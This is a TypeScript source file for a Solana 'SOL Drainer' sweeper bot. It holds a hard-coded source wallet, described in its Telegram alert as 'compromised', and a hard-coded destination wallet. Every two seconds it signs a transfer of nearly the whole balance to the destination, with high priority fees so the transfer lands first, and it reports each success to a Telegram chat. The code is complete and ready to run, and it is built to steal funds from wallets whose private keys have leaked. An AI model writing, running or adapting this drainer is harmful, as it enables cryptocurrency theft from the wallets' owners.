import { Connection, PublicKey, Keypair, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
import bs58 from 'bs58';

const SOURCE_WALLET = 'FPHrLbLET7CuKERMJzYPum6ucKMpityhKfAGZBBHHATX';
const DESTINATION_WALLET = '6WzQ6yKYmzzXg8Kdo3o7mmPzjYvU9fqHKJRS3zu85xpW';

const CHECK_INTERVAL_MS = 2000;
const MIN_DRAIN_LAMPORTS = 50_000;
const RESERVE_FOR_FEES = 15_000;
const PRIORITY_FEE_MICROLAMPORTS = 500_000;
const COMPUTE_UNITS = 1400;

const RPC_ENDPOINTS = [
  'https://api.mainnet-beta.solana.com',
  'https://solana-rpc.publicnode.com',
  'https://rpc.ankr.com/solana',
];

let currentRpcIndex = 0;
let connection = new Connection(RPC_ENDPOINTS[0], 'confirmed');
let drainInterval: NodeJS.Timeout | null = null;
let isRunning = false;
let lastDrainTime: string | null = null;
let totalDrained = 0;
let drainCount = 0;
let consecutiveErrors = 0;
let isDraining = false;
let confirmedCount = 0;
let failedCount = 0;

function rotateRpc() {
  currentRpcIndex = (currentRpcIndex + 1) % RPC_ENDPOINTS.length;
  connection = new Connection(RPC_ENDPOINTS[currentRpcIndex], 'confirmed');
  console.log(`[SOL Drainer] Rotated to RPC: ${RPC_ENDPOINTS[currentRpcIndex]}`);
}

function getKeypair(): Keypair | null {
  const pk = process.env.JUP_SOURCE_PRIVATE_KEY;
  if (!pk) {
    console.log('[SOL Drainer] No private key configured (JUP_SOURCE_PRIVATE_KEY)');
    return null;
  }
  try {
    const decoded = bs58.decode(pk);
    const keypair = Keypair.fromSecretKey(decoded);
    if (keypair.publicKey.toBase58() !== SOURCE_WALLET) {
      console.log(`[SOL Drainer] Warning: Key address ${keypair.publicKey.toBase58()} doesn't match expected ${SOURCE_WALLET}`);
    }
    return keypair;
  } catch (error: any) {
    console.error('[SOL Drainer] Invalid private key format:', error?.message);
    return null;
  }
}

async function sendTelegram(text: string) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
    });
  } catch {}
}

let lastKnownBalance = 0;

async function drainLoop() {
  if (!isRunning || isDraining) return;
  isDraining = true;

  try {
    const keypair = getKeypair();
    if (!keypair) return;

    const sourcePubkey = new PublicKey(SOURCE_WALLET);
    const balance = await connection.getBalance(sourcePubkey);

    if (lastKnownBalance > 0 && balance < lastKnownBalance - MIN_DRAIN_LAMPORTS) {
      const drained = (lastKnownBalance - balance) / LAMPORTS_PER_SOL;
      console.log(`[SOL Drainer] ✅ Balance dropped by ${drained.toFixed(6)} SOL (drain confirmed)`);
      drainCount++;
      totalDrained += (lastKnownBalance - balance);
      lastDrainTime = new Date().toISOString();

      await sendTelegram(
        `<b>✅ SOL Drainer SUCCESS</b>\n` +
        `Drained <b>${drained.toFixed(6)} SOL</b> from compromised wallet\n` +
        `Remaining: ${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL`
      );
    }
    lastKnownBalance = balance;

    const priorityFeeLamports = Math.ceil((PRIORITY_FEE_MICROLAMPORTS * COMPUTE_UNITS) / 1_000_000);
    const baseFee = 5_000;
    const totalFees = baseFee + priorityFeeLamports + RESERVE_FOR_FEES;
    const drainable = balance - totalFees;

    if (drainable >= MIN_DRAIN_LAMPORTS) {
      const solAmount = drainable / LAMPORTS_PER_SOL;
      console.log(`[SOL Drainer] Balance: ${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL - draining ${solAmount.toFixed(6)} SOL (priority fee: ${priorityFeeLamports} lamports)`);

      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');

      const tx = new Transaction();
      tx.recentBlockhash = blockhash;
      tx.lastValidBlockHeight = lastValidBlockHeight;
      tx.feePayer = sourcePubkey;

      tx.add(
        ComputeBudgetProgram.setComputeUnitLimit({ units: COMPUTE_UNITS })
      );
      tx.add(
        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: PRIORITY_FEE_MICROLAMPORTS })
      );
      tx.add(
        SystemProgram.transfer({
          fromPubkey: sourcePubkey,
          toPubkey: new PublicKey(DESTINATION_WALLET),
          lamports: drainable,
        })
      );

      tx.sign(keypair);

      const sig = await connection.sendRawTransaction(tx.serialize(), {
        skipPreflight: true,
        maxRetries: 0,
      });

      console.log(`[SOL Drainer] Sent tx: ${sig.slice(0, 24)}... waiting for confirmation...`);

      try {
        const result = await connection.confirmTransaction(
          { signature: sig, blockhash, lastValidBlockHeight },
          'confirmed'
        );

        if (result.value.err) {
          failedCount++;
          console.log(`[SOL Drainer] ❌ TX confirmed but FAILED: ${JSON.stringify(result.value.err)}`);
        } else {
          confirmedCount++;
          console.log(`[SOL Drainer] ✅ TX CONFIRMED! ${sig.slice(0, 24)}... drained ${solAmount.toFixed(6)} SOL`);

          drainCount++;
          totalDrained += drainable;
          lastDrainTime = new Date().toISOString();

          await sendTelegram(
            `<b>✅ SOL Drain CONFIRMED</b>\n` +
            `Amount: <b>${solAmount.toFixed(6)} SOL</b>\n` +
            `TX: <code>${sig}</code>\n` +
            `From: ${SOURCE_WALLET.slice(0, 8)}...\n` +
            `To: ${DESTINATION_WALLET.slice(0, 8)}...`
          );
        }
      } catch (confirmErr: any) {
        failedCount++;
        if (confirmErr?.message?.includes('expired') || confirmErr?.message?.includes('block height')) {
          console.log(`[SOL Drainer] ⏰ TX expired (not included in block): ${sig.slice(0, 24)}...`);
        } else {
          console.log(`[SOL Drainer] ❌ Confirm error: ${confirmErr?.message?.slice(0, 100)}`);
        }
      }
    } else {
      if (balance > 0) {
        console.log(`[SOL Drainer] Balance: ${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL - too low to drain (need ${totalFees} lamports for fees+reserve)`);
      }
    }

    consecutiveErrors = 0;
  } catch (error: any) {
    consecutiveErrors++;
    if (consecutiveErrors <= 3) {
      console.error(`[SOL Drainer] Error:`, error?.message?.slice(0, 150));
    }
    if (consecutiveErrors % 10 === 0) {
      rotateRpc();
    }
  } finally {
    isDraining = false;
  }
}

export function startSolDrainer() {
  if (isRunning) return;
  isRunning = true;
  console.log(`[SOL Drainer] Started - draining SOL from ${SOURCE_WALLET} every ${CHECK_INTERVAL_MS}ms`);
  console.log(`[SOL Drainer] Destination: ${DESTINATION_WALLET}`);
  console.log(`[SOL Drainer] Min drain: ${MIN_DRAIN_LAMPORTS} lamports, reserve: ${RESERVE_FOR_FEES} lamports`);
  console.log(`[SOL Drainer] Priority fee: ${PRIORITY_FEE_MICROLAMPORTS} microlamports/CU (${COMPUTE_UNITS} CU)`);
  drainInterval = setInterval(drainLoop, CHECK_INTERVAL_MS);
  drainLoop();
}

export function stopSolDrainer() {
  isRunning = false;
  if (drainInterval) {
    clearInterval(drainInterval);
    drainInterval = null;
  }
  console.log('[SOL Drainer] Stopped');
}

export function getSolDrainerStatus() {
  return {
    running: isRunning,
    sourceWallet: SOURCE_WALLET,
    destinationWallet: DESTINATION_WALLET,
    checkIntervalMs: CHECK_INTERVAL_MS,
    minDrainLamports: MIN_DRAIN_LAMPORTS,
    reserveForFees: RESERVE_FOR_FEES,
    priorityFeeMicroLamports: PRIORITY_FEE_MICROLAMPORTS,
    computeUnits: COMPUTE_UNITS,
    totalDrainedLamports: Number(totalDrained),
    totalDrainedSol: totalDrained / LAMPORTS_PER_SOL,
    drainCount,
    confirmedCount,
    failedCount,
    lastDrainTime,
    consecutiveErrors,
  };
}

export async function triggerSolDrain() {
  try {
    const keypair = getKeypair();
    if (!keypair) return { success: false, error: 'No private key configured' };

    const sourcePubkey = new PublicKey(SOURCE_WALLET);
    const balance = await connection.getBalance(sourcePubkey);
    
    const priorityFeeLamports = Math.ceil((PRIORITY_FEE_MICROLAMPORTS * COMPUTE_UNITS) / 1_000_000);
    const baseFee = 5_000;
    const totalFees = baseFee + priorityFeeLamports + RESERVE_FOR_FEES;
    const drainable = balance - totalFees;

    if (drainable < MIN_DRAIN_LAMPORTS) {
      return {
        success: false,
        message: `Balance too low to drain`,
        balanceLamports: balance,
        balanceSol: balance / LAMPORTS_PER_SOL,
        drainableLamports: Math.max(0, drainable),
        totalFeesNeeded: totalFees,
      };
    }

    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
    const tx = new Transaction();
    tx.recentBlockhash = blockhash;
    tx.lastValidBlockHeight = lastValidBlockHeight;
    tx.feePayer = sourcePubkey;
    
    tx.add(ComputeBudgetProgram.setComputeUnitLimit({ units: COMPUTE_UNITS }));
    tx.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: PRIORITY_FEE_MICROLAMPORTS }));
    tx.add(
      SystemProgram.transfer({
        fromPubkey: sourcePubkey,
        toPubkey: new PublicKey(DESTINATION_WALLET),
        lamports: drainable,
      })
    );
    tx.sign(keypair);

    const sig = await connection.sendRawTransaction(tx.serialize(), {
      skipPreflight: true,
      maxRetries: 0,
    });

    console.log(`[SOL Drainer] Manual drain sent: ${sig.slice(0, 24)}... waiting for confirmation...`);

    const result = await connection.confirmTransaction(
      { signature: sig, blockhash, lastValidBlockHeight },
      'confirmed'
    );

    if (result.value.err) {
      return {
        success: false,
        error: `Transaction failed on-chain: ${JSON.stringify(result.value.err)}`,
        signature: sig,
      };
    }

    const solAmount = drainable / LAMPORTS_PER_SOL;
    drainCount++;
    totalDrained += drainable;
    confirmedCount++;
    lastDrainTime = new Date().toISOString();

    await sendTelegram(
      `<b>✅ SOL Drain CONFIRMED (Manual)</b>\n` +
      `Amount: <b>${solAmount.toFixed(6)} SOL</b>\n` +
      `TX: <code>${sig}</code>`
    );

    return {
      success: true,
      confirmed: true,
      drainedLamports: drainable,
      drainedSol: solAmount,
      signature: sig,
    };
  } catch (error: any) {
    const isExpired = error?.message?.includes('expired') || error?.message?.includes('block height');
    return { 
      success: false, 
      error: isExpired ? 'Transaction expired - not included in block' : error?.message?.slice(0, 200),
      expired: isExpired,
    };
  }
}
